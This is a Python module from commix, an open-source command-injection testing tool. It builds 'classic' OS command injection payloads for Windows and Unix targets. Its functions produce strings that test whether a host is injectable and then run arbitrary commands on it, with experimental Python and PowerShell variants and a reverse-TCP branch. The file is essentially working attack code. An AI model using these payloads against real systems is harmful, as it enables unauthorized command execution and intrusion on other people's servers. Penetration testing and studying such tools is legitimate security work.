#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2015 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings

"""
The classic injection technique on Classic OS Command Injection.
The available "classic" payloads.
"""

"""
Classic decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == "win":
    payload = (separator + " "
              "for /f \"delims=\" %i in ('cmd /c \"" + 
              "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
              "\"') do @set /p = " + TAG + "%i" + TAG + TAG + " <nul"
              )
  else:  
    payload = (separator + 
              "echo " + TAG +
              "$((" + str(randv1) + "%2B" + str(randv2) + "))"  +
              "$(echo " + TAG + ")" + TAG + ""
               ) 
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"print '" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "'\""
    payload = (separator + " " 
              "for /f \"delims=\" %i in ('cmd /c " + 
              python_payload +
              "') do @set /p =%i <nul"
              )
  else:  
    payload = (separator + 
              " python -c \"print '" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "'\""
               )
  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, TAG, cmd):
  if settings.TARGET_OS == "win":
    payload = (separator + " "
              "for /f \"delims=\" %i in ('cmd /c " + 
              cmd + 
              "') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + " <nul"
              )
  else:          
    payload = (separator + 
              "echo " + TAG +
              "$(echo " + TAG + ")" +
              "$(echo $(" + cmd + "))" +
              "$(echo " + TAG + ")" + TAG + ""
              )
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, TAG, cmd):
  if settings.TARGET_OS == "win":
    if settings.REVERSE_TCP:
      payload = (separator + " " + cmd + " "
                )
    else:
      payload = (separator + " " +
                settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('powershell.exe write-host " + TAG + TAG +" $(" + cmd + ") "+ TAG + TAG + "')\""
                )
                                                                      
  else:
    payload = (separator + 
              " python -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'$(echo $(" +cmd+ "))'%2B'" + TAG + "'%2B'" + TAG + "'\""
              )
  return payload

#eof
